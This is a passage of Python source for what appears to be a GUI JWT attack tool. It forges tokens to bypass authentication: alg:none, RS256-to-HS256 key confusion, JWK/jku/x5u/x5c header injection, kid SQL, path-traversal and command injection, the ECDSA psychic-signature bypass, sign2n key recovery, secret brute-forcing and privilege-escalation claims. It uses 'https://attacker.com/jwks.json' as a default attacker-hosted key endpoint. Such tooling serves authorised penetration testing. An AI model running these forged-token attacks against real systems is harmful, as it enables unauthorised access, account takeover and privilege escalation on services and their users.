            f"QTabWidget::pane {{ border:1px solid {COLOR_BORDER}; background:{COLOR_DARK_BG}; }}"
            f"QTabBar::tab {{ background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};"
            f" padding:4px 12px; border:1px solid {COLOR_BORDER}; border-bottom:none;"
            f" border-top-left-radius:3px; border-top-right-radius:3px; margin-right:1px; }}"
            f"QTabBar::tab:selected {{ background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};"
            f" border-bottom:2px solid {COLOR_ACCENT}; }}"
        )

    def _table_style(self) -> str:
        return (
            f"QTableWidget {{ background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" gridline-color:{COLOR_BORDER}; border:none; }}"
            f"QTableWidget::item:selected {{ background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_BRIGHT}; }}"
            f"QHeaderView::section {{ background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_BRIGHT};"
            f" border:1px solid {COLOR_BORDER}; padding:4px; font-weight:bold; }}"
            f"QTableWidget::item {{ border-bottom:1px solid {COLOR_BORDER}; }}"
        )

    # ─────────────────────────────────────────────────────────────────────
    # Slots / actions
    # ─────────────────────────────────────────────────────────────────────

    @pyqtSlot(bool)
    def _on_select_all_attacks(self, checked: bool):
        """Check or uncheck all individual attack checkboxes."""
        # Block signals on each child so _on_attack_cb_changed doesn't fire N times
        for cb in self._attack_checks.values():
            cb.blockSignals(True)
            cb.setChecked(checked)
            cb.blockSignals(False)

    def _on_attack_cb_changed(self):
        """Keep the 'All' master checkbox in sync when individual boxes change."""
        all_checked  = all(cb.isChecked() for cb in self._attack_checks.values())
        none_checked = not any(cb.isChecked() for cb in self._attack_checks.values())
        self._cb_select_all.blockSignals(True)
        if all_checked:
            self._cb_select_all.setCheckState(Qt.Checked)
        elif none_checked:
            self._cb_select_all.setCheckState(Qt.Unchecked)
        else:
            self._cb_select_all.setCheckState(Qt.PartiallyChecked)
        self._cb_select_all.blockSignals(False)

    def _on_https_toggled(self, checked: bool):
        self.port_spin.setValue(443 if checked else 80)

    def _browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", os.path.expanduser("~"), "Text files (*.txt);;All files (*)"
        )
        if path:
            self.wordlist_edit.setText(path)

    def _pick_fuzz_claim(self):
        """Show a menu listing the decoded payload keys so the user can select one."""
        if not self._jwt_payload:
            QMessageBox.information(self, "Claim Fuzzer",
                                    "Parse a JWT first — the payload claim names will appear here.")
            return
        menu = QMenu(self)
        for key in self._jwt_payload.keys():
            act = menu.addAction(f"{key}  =  {self._jwt_payload[key]!r}")
            act.setData(key)
        chosen = menu.exec_(self.fuzz_claim_edit.mapToGlobal(
            self.fuzz_claim_edit.rect().bottomLeft()
        ))
        if chosen and chosen.data():
            self.fuzz_claim_edit.setText(chosen.data())

    def _on_token_display_changed(self, text: str):
        """Live-decode token as user types in the token display field."""
        text = text.strip()
        parts = _split_jwt(text)
        if parts:
            self._decode_and_display_jwt(text)

    def parse_jwt(self):
        """Extract JWT from the request editor, decode and display."""
        raw = self.request_edit.toPlainText().strip()
        if not raw:
            self._set_status("[!]  Paste a raw HTTP request first.", COLOR_WARNING)
            return

        self._parsed_request = _parse_raw_request(raw)
        host = self._parsed_request.get("host", "")
        if host:
            if ":" in host:
                h, p = host.rsplit(":", 1)
                try:
                    self.port_spin.setValue(int(p))
                    host = h
                except ValueError:
                    pass
            self.host_edit.setText(host)

        token = _extract_jwt_from_request(raw)
        if not token:
            self._set_status("[-]  No JWT found in request. "
                             "Make sure Authorization: Bearer or Cookie contains a JWT.", COLOR_CRITICAL)
            return

        self._jwt_token = token
        self.token_display.blockSignals(True)
        self.token_display.setText(token)
        self.token_display.blockSignals(False)

        # Auto-detect where the JWT lives and update the location combo accordingly
        detected = _detect_jwt_location(raw)
        self._jwt_location = detected
        if detected.startswith("Cookie:"):
            self.location_combo.setCurrentIndex(1)
            cookie_name = detected.split(":", 1)[1]
            self._set_status(
                f"[+]  JWT detected in Cookie '{cookie_name}' — location set automatically.",
                COLOR_SUCCESS,
            )
        elif detected == "Body":
            self.location_combo.setCurrentIndex(2)
        else:
            self.location_combo.setCurrentIndex(0)

        self._decode_and_display_jwt(token)

    def _decode_and_display_jwt(self, token: str):
        parts = _split_jwt(token)
        if not parts:
            self._set_status("[-]  Invalid JWT format (expected 3 dot-separated parts).", COLOR_CRITICAL)
            return

        h_b64, p_b64, sig_b64 = parts
        header = _decode_part(h_b64)
        payload = _decode_part(p_b64)

        if header is None or payload is None:
            self._set_status("[-]  Could not decode JWT header/payload.", COLOR_CRITICAL)
            return

        self._jwt_header = header
        self._jwt_payload = payload
        self._jwt_sig = sig_b64
        self._jwt_token = token

        # Display
        self.header_view.setPlainText(json.dumps(header, indent=2))
        self.payload_view.setPlainText(json.dumps(payload, indent=2))

        sig_info = (
            f"Base64-URL encoded signature:\n{sig_b64}\n\n"
            f"Length: {len(sig_b64)} chars\n"
            f"Decoded bytes: {len(_b64url_decode(sig_b64)) if sig_b64 else 0} bytes"
            if sig_b64 else "[!]  Empty signature (potential alg:none)"
        )
        self.sig_view.setPlainText(sig_info)

        # Analysis
        self.verify_view.setPlainText(self._analyze_jwt(header, payload, sig_b64))

        # Auto-select attacks appropriate for this algorithm family
        alg = header.get("alg", "")
        enabled_count = self._auto_select_attacks_for_alg(alg)

        self._set_status(
            f"[+]  JWT decoded — alg:{alg or '?'}  "
            f"sub:{payload.get('sub', payload.get('user', payload.get('userId', '?')))}  "
            f"| {enabled_count} tests auto-selected for {alg or 'unknown alg'}",
            COLOR_SUCCESS,
        )

    # ─────────────────────────────────────────────────────────────────
    # Smart attack auto-selection based on JWT algorithm
    # ─────────────────────────────────────────────────────────────────

    def _auto_select_attacks_for_alg(self, alg: str) -> int:
        """
        Check / uncheck attack checkboxes based on the JWT algorithm family.

        Algorithm → relevant attack families:
          HS*   — brute-force secret, blank-pw; NO asymmetric attacks
          RS*   — alg-confusion, sign2n, JWK/JKU/x5u/x5c; NO brute-force
          PS*   — same as RS* (RSA-PSS); NO brute-force
          ES*   — psychic-sig (CVE-2022-21449), JWK/JKU/x5u/x5c; NO brute-force
          EdDSA — JWK/JKU/x5u/x5c; NO brute-force, NO psychic-sig
          none  — brute-force already moot; asymmetric n/a

        Returns the number of enabled attacks after selection.
        """
        a = alg.upper()

        is_hmac      = a.startswith("HS")
        is_rsa_pkcs  = a.startswith("RS")              # RS256 / RS384 / RS512
        is_rsa_pss   = a.startswith("PS")              # PS256 / PS384 / PS512
        is_rsa       = is_rsa_pkcs or is_rsa_pss
        is_ecdsa     = a.startswith("ES")              # ES256 / ES384 / ES512
        is_eddsa     = a in ("EDDSA", "ED25519", "ED448")
        is_asym      = is_rsa or is_ecdsa or is_eddsa  # any asymmetric key type
        is_alg_none  = a in ("NONE", "")

        # key → True (enable) / False (disable)
        sel: Dict[str, bool] = {
            # ── Universal: always applicable regardless of algorithm ─────
            "alg_none":           True,
            "empty_sig":          True,
            "kid_sqli":           True,
            "kid_traversal":      True,
            "kid_rce":            True,
            "priv_esc":           True,
            "claim_tamper":       True,
            "exp_extend":         True,
            "null_claims":        True,
            "cty_inject":         True,
            "type_confusion":     True,
            "ssrf_claims":        True,
            "reflected":          True,
            "claim_fuzz":         True,
            # ── alg:none mix variants — always applicable ────────────────
            "mix_none_priv":      True,
            "mix_none_exp":       True,
            "mix_none_null":      True,
            "mix_kid_sqli_none":  True,
            "mix_full_bypass":    True,
            # ── HMAC / symmetric only ────────────────────────────────────
            "weak_secret":        is_hmac or is_alg_none,
            "blank_pw":           is_hmac or is_alg_none,
            # ── RSA PKCS#1 only (key-confusion & key-recovery) ───────────
            "alg_confusion":      is_rsa_pkcs,   # RS256 → HS256 using public key as HMAC secret
            "sign2n":             is_rsa_pkcs,   # recover RSA modulus from 2 signatures
            "mix_confusion_priv": is_rsa_pkcs,   # RS256→HS256 combined with privilege escalation
            # ── Asymmetric key header injections (RSA + ECDSA + EdDSA) ──
            "embedded_jwk":       is_asym,       # self-sign with embedded JWK key
            "jku_inject":         is_asym,       # SSRF via jku header
            "x5u_inject":         is_asym,       # SSRF via x5u header
            "x5c_inject":         is_asym,       # self-signed cert embedded in x5c
            "mix_jku_priv":       is_asym,       # jku injection + privilege escalation
            "mix_jwk_priv":       is_asym,       # embedded JWK + privilege escalation
            # ── ECDSA only ───────────────────────────────────────────────
            "psychic_sig":        is_ecdsa,      # CVE-2022-21449 zero-signature bypass
        }

        # Apply to checkboxes (block signals to avoid cascade)
        for key, checked in sel.items():
            cb = self._attack_checks.get(key)
            if cb is not None:
                cb.blockSignals(True)
                cb.setChecked(checked)
                cb.blockSignals(False)

        # Refresh the master "Select All" tri-state without re-triggering
        self._on_attack_cb_changed()

        return sum(1 for v in sel.values() if v)

    def _analyze_jwt(self, header: dict, payload: dict, sig: str) -> str:
        """Generate a human-readable security analysis of the decoded JWT."""
        lines = []
        alg = header.get("alg", "none")
        lines.append("=== JWT Security Analysis ===\n")

        # Algorithm
        if alg.lower() == "none":
            lines.append("[!!] [CRITICAL] Algorithm is 'none' — no signature verification!")
        elif alg.lower().startswith("hs"):
            lines.append(f"[!]  [MEDIUM]   Algorithm: {alg} — symmetric key (shared secret).")
            lines.append("             Consider RS256/ES256 for asymmetric signing.")
        elif alg.lower().startswith("rs") or alg.lower().startswith("es"):
            lines.append(f"[+] [INFO]     Algorithm: {alg} — asymmetric signing.")
        else:
            lines.append(f"[!]  [LOW]      Unknown/custom algorithm: {alg}")

        # kid
        if "kid" in header:
            lines.append(f"\n[!]  [HIGH]     'kid' header present: {header['kid']!r}")
            lines.append("             Check for SQL injection and path traversal via kid parameter.")

        # jku / x5u
        for hk in ("jku", "x5u", "jwk", "x5c"):
            if hk in header:
                lines.append(f"\n[!!] [HIGH]     '{hk}' header present: {header[hk]!r}")
                lines.append(f"             Attacker may control the key used for verification!")

        # crit
        if "crit" in header:
            lines.append(f"\n[!]  [MEDIUM]   'crit' header present: {header['crit']}")

        # Expiry
        exp = payload.get("exp")
        now = int(time.time())
        if exp is None:
            lines.append("\n[!]  [MEDIUM]   No 'exp' claim — token never expires!")
        elif exp < now:
            lines.append(f"\n[!]  [INFO]     Token is EXPIRED (exp={exp}, now={now})")
        else:
            remaining = exp - now
            lines.append(f"\n[+] [INFO]     Token valid for {remaining}s ({remaining//3600}h {(remaining%3600)//60}m)")

        # nbf
        nbf = payload.get("nbf")
        if nbf and nbf > now:
            lines.append(f"[!]  [LOW]      Token not yet valid (nbf={nbf})")

        # Audience
        if "aud" not in payload:
            lines.append("\n[!]  [LOW]      No 'aud' claim — audience not validated.")

        # Sensitive claims
        sensitive_patterns = ["pass", "secret", "key", "token", "credit", "ssn", "dob"]
        for k, v in payload.items():
            for pat in sensitive_patterns:
                if pat in k.lower() and isinstance(v, str):
                    lines.append(f"\n[!!] [HIGH]     Sensitive claim '{k}' in payload: {v[:30]!r}")
                    break

        # Empty signature
        if not sig:
            lines.append("\n[!!] [CRITICAL] Empty signature — alg:none in effect!")

        lines.append("\n\n=== Claims Summary ===")
        for k, v in payload.items():
            lines.append(f"  {k}: {v!r}")

        return "\n".join(lines)

    def _run_all_attacks(self):
        """Check all attacks, then run."""
        for cb in self._attack_checks.values():
            cb.setChecked(True)
        self._run_selected_attacks()

    def _run_selected_attacks(self):
        if not self._jwt_token:
            self._set_status("[!]  Parse a JWT first (click '[?] Parse JWT').", COLOR_WARNING)
            return
        if not self._jwt_header:
            self._set_status("[!]  No JWT decoded. Parse the request first.", COLOR_WARNING)
            return

        # ── sign2n: run key recovery in a subprocess BEFORE building tasks ───────
        # _sign2n_candidates calls pow(sig, 65537) on huge bignums and MUST NOT
        # run on the main thread — even with gmpy2 it takes several seconds and
        # would block Qt's event loop completely.  We fork a subprocess via
        # _Sign2nComputeThread (same approach as repeater_tab) and continue in
        # the completion callback _on_sign2n_precomputed / _on_sign2n_precompute_error.
        _enabled = {k: cb.isChecked() for k, cb in self._attack_checks.items()}
        _tok1 = getattr(self, "sign2n_tok1_edit", None)
        _tok2 = getattr(self, "sign2n_tok2_edit", None)
        _t1 = _tok1.toPlainText().strip() if _tok1 else ""
        _t2 = _tok2.toPlainText().strip() if _tok2 else ""
        _needs_sign2n = (_enabled.get("sign2n") and _GMPY2_AVAILABLE and _t1 and _t2)

        if _needs_sign2n:
            from repeater_tab import _Sign2nComputeThread
            self._attack_results.clear()
            self.results_table.setRowCount(0)
            self.run_all_btn.setEnabled(False)
            self.run_sel_btn.setEnabled(False)
            self._set_status("⏳  sign2n: recovering RSA public key from two tokens… (may take 5–30 s)",
                             COLOR_TEXT_MUTED)

            self._sign2n_thread = _Sign2nComputeThread(_t1, _t2, parent=self)
            self._sign2n_thread.finished.connect(self._on_sign2n_precomputed)
            self._sign2n_thread.error.connect(self._on_sign2n_precompute_error)
            self._sign2n_thread.start()
            return  # ← continues in _on_sign2n_precomputed / _on_sign2n_precompute_error

        self._attack_results.clear()
        self.results_table.setRowCount(0)
        tasks = self._build_attack_tasks(sign2n_pems=[])
        if not tasks:
            self._set_status("[!]  No attacks selected.", COLOR_WARNING)
            return

        self._populate_results_pending(tasks)
        self._start_baseline_then_attacks(tasks)

    def _on_sign2n_precomputed(self, pems: list) -> None:
        """Called on the main thread when sign2n key recovery finishes successfully."""
        self.run_all_btn.setEnabled(True)
        self.run_sel_btn.setEnabled(True)
        tasks = self._build_attack_tasks(sign2n_pems=pems)
        if not tasks:
            self._set_status("[!]  No attacks selected.", COLOR_WARNING)
            return
        self._populate_results_pending(tasks)
        self._start_baseline_then_attacks(tasks)

    def _on_sign2n_precompute_error(self, msg: str) -> None:
        """Called on the main thread when sign2n key recovery fails."""
        self.run_all_btn.setEnabled(True)
        self.run_sel_btn.setEnabled(True)
        # Proceed with remaining attacks, substituting an error stub for sign2n
        tasks = self._build_attack_tasks(sign2n_pems=None, sign2n_error=msg)
        if not tasks:
            self._set_status(f"[!]  sign2n failed: {msg}", COLOR_WARNING)
            return
        self._populate_results_pending(tasks)
        self._start_baseline_then_attacks(tasks)

    def _build_attack_tasks(self, sign2n_pems: list = None,
                             sign2n_error: str = "") -> List[AttackResult]:
        """Forge all selected attack tokens and build result stubs.

        sign2n_pems: pre-computed list of PEM strings from the async key-recovery
                     subprocess (empty list = not requested; None = failed).
        sign2n_error: error message when sign2n_pems is None.
        """
        results: List[AttackResult] = []
        # ── Pre-scan probes (always first) ────────────────────────────────────
        # Probe 1: broken signature (chop last 4 chars of original sig)
        if self._jwt_token.count(".") == 2 and self._jwt_sig:
            orig_parts = self._jwt_token.split(".", 2)
            broken_token = f"{orig_parts[0]}.{orig_parts[1]}.{orig_parts[2][:-4]}"
            results.append(AttackResult(
                name="Pre-scan: Broken Signature",
                token=broken_token,
                description="Original token with last 4 sig chars removed — baseline match = sig NOT verified",
                severity="Critical",
            ))
        # Probe 2: no token (sentinel stripped by _send_http_request)
        results.append(AttackResult(
            name="Pre-scan: No Token (auth check)",
            token="__NO_TOKEN__",
            description="Request sent without any JWT — baseline match = auth NOT enforced",
            severity="High",
        ))
        # ── Normal attacks below ──────────────────────────────────────────────
        header = copy.deepcopy(self._jwt_header)
        payload = copy.deepcopy(self._jwt_payload)
        sig = self._jwt_sig
        secret = self.custom_secret_edit.text().encode() or b"secret"
        attacker_url = self.attacker_url_edit.text().strip() or "https://attacker.com/jwks.json"
        trusted_domain = self.trusted_domain_edit.text().strip()
        # Auto-convert JWK/PEM input to normalized PEM (idempotent for PEM;
        # converts JWK → PEM on first run; writes result back to pubkey_edit).
        if hasattr(self, "pubkey_input_edit") and self.pubkey_input_edit.toPlainText().strip():
            self._convert_attack_pubkey()
        pubkey_pem = self.pubkey_edit.toPlainText()
        # Resolve the RSA key for JKU/x5u attacks.
        # Priority: explicit combo selection > Key Manager table selection > server-hosted key.
        km_key_data: Optional[dict] = None
        if hasattr(self, 'jku_km_key_combo'):
            _combo_idx = self.jku_km_key_combo.currentData()  # None = auto
            if _combo_idx is not None and 0 <= _combo_idx < len(self._managed_keys):
                km_key_data = self._managed_keys[_combo_idx]
        if km_key_data is None and hasattr(self, "km_table"):
            _km_idx = self.km_table.currentRow()
            if 0 <= _km_idx < len(self._managed_keys):
                _k = self._managed_keys[_km_idx]
                if _k.get("_type") == "RSA" and _k.get("_priv_jwk"):
                    km_key_data = _k
        if km_key_data is None and self._srv_key_data and self._srv_key_data.get("_priv_jwk"):
            km_key_data = self._srv_key_data  # auto-use the key the server is hosting

        enabled = {k: cb.isChecked() for k, cb in self._attack_checks.items()}

        if enabled.get("alg_none"):
            for name, token in JWTEngine.forge_alg_none(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Remove signature, set alg to none variant",
                    severity="Critical",
                ))

        if enabled.get("empty_sig"):
            for name, token in JWTEngine.forge_empty_signature(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Token with empty or null signature",
                    severity="High",
                ))

        if enabled.get("alg_confusion") and pubkey_pem.strip():
            name, token = JWTEngine.forge_alg_confusion_hs256(header, payload, pubkey_pem)
            results.append(AttackResult(
                name=name, token=token,
                description="Sign with HS256 using RSA public key as secret",
                severity="Critical",
            ))
        elif enabled.get("alg_confusion") and not pubkey_pem.strip():
            results.append(AttackResult(
                name="RS256→HS256 (no pubkey provided)",
                token="",
                description="Paste RSA public key as JWK or PEM in Attack Config, then click Convert Key.",
                severity="Info",
                error="No public key provided",
            ))

        if enabled.get("embedded_jwk"):
            for name, token in JWTEngine.forge_embedded_jwk(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description=(
                        "Embedded JWK header injection: attacker-generated "
                        "RSA key pair; public key embedded in jwk header with matching kid; "
                        "token self-signed with attacker private key."
                    ),
                    severity="Critical",
                ))

        if enabled.get("jku_inject"):
            variants, jwks_json = JWTEngine.forge_jku_injection(
                header, payload, attacker_url, secret,
                trusted_domain=trusted_domain, km_key_data=km_key_data
            )
            _km_note = (
                "\n\n✅ Using Key Manager key — JWT is signed with the SAME private key "
                "as the JWKS hosted at your exploit server."
                if km_key_data else
                "\n\n⚠ No Key Manager key selected — a fresh ephemeral key pair was generated. "
                "You MUST host the JWKS JSON shown below at your exploit server URL "
                "(it will change every time you run the attack)."
            )
            _td_note = (
                f"\n\nTrusted-domain allow-list bypass variants generated for: {trusted_domain}"
                if trusted_domain else ""
            )
            for name, token in variants:
                results.append(AttackResult(
                    name=name, token=token,
                    description=(
                        "jku header injection: set jku to attacker-controlled "
                        "JWKS endpoint, sign with matching RSA private key.\n\n"
                        f"Host the following JWKS JSON at: {attacker_url}\n\n{jwks_json}"
                        f"{_km_note}{_td_note}"
                    ),
                    severity="High",
                ))

        if enabled.get("x5u_inject"):
            variants, cert_pem = JWTEngine.forge_x5u_injection(header, payload, attacker_url, secret)
            for name, token in variants:
                results.append(AttackResult(
                    name=name, token=token,
                    description=(
                        "x5u header injection: set x5u to attacker-controlled cert URL, "
                        "sign with matching RSA private key.\n\n"
                        f"Host the following PEM cert at: {attacker_url}\n\n{cert_pem}"
                    ),
                    severity="High",
                ))

        if enabled.get("x5c_inject"):
            for name, token in JWTEngine.forge_x5c_injection(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description=(
                        "x5c header injection: embed attacker-controlled "
                        "self-signed certificate (base64 DER) in the x5c header array. "
                        "Server extracts the public key from x5c[0] and verifies RS256 signature. "
                        "Attacker signs with the matching private key for full bypass."
                    ),
                    severity="Critical",
                ))

        if enabled.get("cty_inject"):
            for name, token in JWTEngine.forge_cty_injection(header, payload, secret):
                results.append(AttackResult(
                    name=name, token=token,
                    description=(
                        "cty header injection: inject unusual Content-Type values to exploit "
                        "parser confusion in JWT libraries (e.g., XML/JOSE/CBOR/Java deser). "
                        "Some libraries switch parsing logic based on cty, leading to "
                        "signature bypass or unexpected deserialization."
                    ),
                    severity="High",
                ))

        if enabled.get("kid_sqli"):
            for name, token in JWTEngine.forge_kid_sqli(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="SQL injection via kid header parameter",
                    severity="Critical",
                ))

        if enabled.get("kid_traversal"):
            for name, token in JWTEngine.forge_kid_traversal(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Path traversal in kid to use /dev/null as key file",
                    severity="High",
                ))

        if enabled.get("priv_esc"):
            for name, token in JWTEngine.forge_privilege_escalation(header, payload, secret):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Modify role/admin claims for privilege escalation",
                    severity="High",
                ))

        if enabled.get("exp_extend"):
            name, token = JWTEngine.forge_exp_extension(header, payload, secret=secret)
            results.append(AttackResult(
                name=name, token=token,
                description="Extend token expiry by one year",
                severity="Medium",
            ))

        if enabled.get("null_claims"):
            for name, token in JWTEngine.forge_null_values(header, payload, secret):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Replace subject/user with null/empty to bypass auth",
                    severity="Medium",
                ))

        if enabled.get("claim_fuzz"):
            claim_name = self.fuzz_claim_edit.text().strip() or "sub"
            raw_values = self.fuzz_values_edit.toPlainText().splitlines()
            fuzz_values = [v.strip() for v in raw_values if v.strip()]
            if fuzz_values:
                for name, token in JWTEngine.forge_claim_fuzz(
                    header, payload, claim_name, fuzz_values, secret
                ):
                    results.append(AttackResult(
                        name=name, token=token,
                        description=f"Claim fuzz: {claim_name} = {name.split('=',1)[1].split('[')[0].strip()!r}",
                        severity="High",
                    ))
            else:
                results.append(AttackResult(
                    name="Claim Fuzz (no values)",
                    token="",
                    description="Add values to the Claim Fuzzer list in Attack Config.",
                    severity="Info",
                    error="No values configured",
                ))

        if enabled.get("weak_secret"):
            wordlist_path = self.wordlist_edit.text().strip()
            wordlist = self._load_wordlist(wordlist_path)
            found_secret = JWTEngine.brute_force_secret(
                self._jwt_token.split(".")[0],
                self._jwt_token.split(".")[1],
                sig,
                wordlist,
            )
            if found_secret:
                desc = f"CRACKED! Secret = {found_secret!r}"
                results.append(AttackResult(
                    name=f"Weak Secret: '{found_secret}'",
                    token=self._jwt_token,
                    description=desc,
                    severity="Critical",
                    error="",
                ))
                self._set_status(f"[K]  Weak secret found: {found_secret!r}", COLOR_CRITICAL)
            else:
                results.append(AttackResult(
                    name="Weak Secret Brute-Force",
                    token=self._jwt_token,
                    description=f"Tested {len(wordlist)} secrets — none matched.",
                    severity="Info",
                    error="No match",
                ))

        # ── Mixed / Combined attacks ───────────────────────────────────────
        if enabled.get("mix_none_priv"):
            for name, token in JWTEngine.forge_alg_none_priv_esc(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] alg:none (no sig) + elevated admin/role claims",
                    severity="Critical",
                ))

        if enabled.get("mix_none_exp"):
            for name, token in JWTEngine.forge_alg_none_exp_extend(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] alg:none (no sig) + expiry extended by 1 year",
                    severity="High",
                ))

        if enabled.get("mix_none_null"):
            for name, token in JWTEngine.forge_alg_none_null_claims(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] alg:none (no sig) + null/empty subject bypass",
                    severity="High",
                ))

        if enabled.get("mix_kid_sqli_none"):
            for name, token in JWTEngine.forge_kid_sqli_alg_none(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] kid SQL injection + alg:none double bypass",
                    severity="Critical",
                ))

        if enabled.get("mix_jku_priv"):
            # also pass km_key_data so mixed attack stays consistent
            for name, token in JWTEngine.forge_jku_priv_esc(
                header, payload, attacker_url, secret,
                trusted_domain=trusted_domain, km_key_data=km_key_data
            ):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] jku header injection + privilege escalation claims",
                    severity="Critical",
                ))

        if enabled.get("mix_jwk_priv"):
            for name, token in JWTEngine.forge_embedded_jwk_priv_esc(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] embedded JWK self-signed + privilege escalation claims",
                    severity="Critical",
                ))

        if enabled.get("mix_confusion_priv") and pubkey_pem.strip():
            for name, token in JWTEngine.forge_alg_confusion_priv_esc(header, payload, pubkey_pem):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] RS256→HS256 algorithm confusion + privilege escalation",
                    severity="Critical",
                ))
        elif enabled.get("mix_confusion_priv") and not pubkey_pem.strip():
            results.append(AttackResult(
                name="[MIX] RS256→HS256 + Priv Esc (no pubkey)",
                token="",
                description="Paste RSA public key as JWK or PEM in Attack Config, then click Convert Key.",
                severity="Info",
                error="No public key provided",
            ))

        if enabled.get("mix_full_bypass"):
            for name, token in JWTEngine.forge_full_bypass(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="[MIXED] Maximum bypass: alg:none + admin claims + exp+1yr + empty sig",
                    severity="Critical",
                ))

        # ── Additional exploit techniques ────────────────────────────────
        if enabled.get("psychic_sig"):
            for name, token in JWTEngine.forge_psychic_signature(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="ECDSA Psychic Signature CVE-2022-21449 — zero-value (r=0,s=0) sig",
                    severity="Critical",
                ))

        if enabled.get("blank_pw"):
            name, token = JWTEngine.forge_blank_password(header, payload)
            results.append(AttackResult(
                name=name, token=token,
                description="HS256 signed with empty string — catches blank/default secrets",
                severity="High",
            ))

        if enabled.get("kid_rce"):
            for name, token in JWTEngine.forge_kid_rce(header, payload, attacker_url):
                results.append(AttackResult(
                    name=name, token=token,
                    description="OS command injection via kid header — timing/OOB confirms RCE",
                    severity="Critical",
                ))

        if enabled.get("type_confusion"):
            for name, token in JWTEngine.forge_type_confusion(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Inject dangerous types into claims — triggers processing-order errors",
                    severity="Medium",
                ))

        if enabled.get("ssrf_claims"):
            for name, token in JWTEngine.forge_ssrf_claims(header, payload, attacker_url):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Attacker URL injected per claim — check OOB listener for interactions",
                    severity="High",
                ))

        if enabled.get("reflected"):
            for name, token in JWTEngine.forge_reflected_claims(header, payload):
                results.append(AttackResult(
                    name=name, token=token,
                    description="Canary per claim — if reflected, claim processed before sig check",
                    severity="Medium",
                ))

        if enabled.get("sign2n"):
            if not _GMPY2_AVAILABLE:
                results.append(AttackResult(
                    name="RS256→HS256 (sign2n — skipped)",
                    token="",
                    description="gmpy2 not installed — install with: pip install gmpy2",
                    severity="Info",
                    error="gmpy2 not available",
                ))
            elif sign2n_pems is None:
                # Key recovery was attempted but failed
                results.append(AttackResult(
                    name="RS256→HS256 (sign2n — failed)",
                    token="",
                    description=f"Key recovery failed: {sign2n_error}",
                    severity="Info",
                    error=sign2n_error,
                ))
            elif not sign2n_pems:
                # Either tokens not provided, or sign2n was not pre-run
                _tok1 = getattr(self, "sign2n_tok1_edit", None)
                _tok2 = getattr(self, "sign2n_tok2_edit", None)
                _t1 = _tok1.toPlainText().strip() if _tok1 else ""
                _t2 = _tok2.toPlainText().strip() if _tok2 else ""
                if not _t1 or not _t2:
                    results.append(AttackResult(
                        name="RS256→HS256 (sign2n — no tokens)",
                        token="",
                        description="Paste two valid RS256 tokens in Attack Config → Token 1 / Token 2.",
                        severity="Info",
                        error="Tokens not provided",
                    ))
                # (if non-empty tokens were present, _run_selected_attacks would have
                # pre-computed the PEMs async — reaching here with empty list + tokens
                # means gmpy2 was unavailable, already handled above)
            else:
                # sign2n_pems contains pre-computed candidate keys from the subprocess
                _forged_hdr = dict(header)
                _forged_hdr["alg"] = "HS256"
                _hb = _encode_part(_forged_hdr)
                _pb = _encode_part(payload)
                for _i, _pem in enumerate(sign2n_pems):
                    _raw_sig = hmac.new(
                        _pem.encode("utf-8"),
                        f"{_hb}.{_pb}".encode("ascii"),
                        hashlib.sha256,
                    ).digest()
                    _sig = _b64url_encode(_raw_sig)
                    results.append(AttackResult(
                        name=f"RS256→HS256 (sign2n candidate {_i + 1}/{len(sign2n_pems)})",
                        token=f"{_hb}.{_pb}.{_sig}",
                        description=(
                            f"HS256 token forged using recovered RSA public key "
                            f"(candidate {_i + 1}) as HMAC-SHA256 secret."
                        ),
                        severity="Critical",
                    ))

        return results

    @staticmethod
    def _load_wordlist(path: str) -> List[str]:
        """Load wordlist from file, or return a built-in common-secrets list."""
        builtin = [
            "secret", "secret123", "password", "password123", "jwt_secret",
            "mysecret", "supersecret", "your-256-bit-secret", "changeme",
            "jwt-secret-key", "1234567890", "qwerty", "admin", "root",
            "test", "dev", "development", "production", "staging",
            "JWT_SECRET", "SECRET_KEY", "TOKEN_SECRET", "APP_SECRET",
            "your_secret_key", "my_secret", "key", "private_key",
        ]
        if not path or not os.path.isfile(path):
            return builtin
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                words = [l.strip() for l in f if l.strip()]
            return words or builtin
        except Exception:
            return builtin

    def _populate_results_pending(self, results: List[AttackResult]):
        """Add all attack results to the table as 'Pending'."""
        self._attack_results = results
        self.results_table.setRowCount(len(results))
        for row, r in enumerate(results):
            self._set_table_row(row, r, pending=True)

    def _set_table_row(self, row: int, result: AttackResult, pending: bool = False):
        sev_colors = {
            "Critical": COLOR_CRITICAL,
            "High": COLOR_HIGH,
            "Medium": COLOR_MEDIUM,
            "Low": COLOR_LOW,
            "Info": COLOR_TEXT_MUTED,
        }
        sev_color = sev_colors.get(result.severity, COLOR_TEXT_MUTED)

        def _item(text, color=None, align=Qt.AlignLeft | Qt.AlignVCenter):
            it = QTableWidgetItem(str(text))
            it.setTextAlignment(align)
            if color:
                it.setForeground(QBrush(QColor(color)))
            return it

        is_baseline = (result.name == "Baseline (Original Token)")
        row_label = "BL" if is_baseline else str(row)
        self.results_table.setItem(row, 0, _item(row_label, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.results_table.setItem(row, 1, _item(result.name))

        if pending:
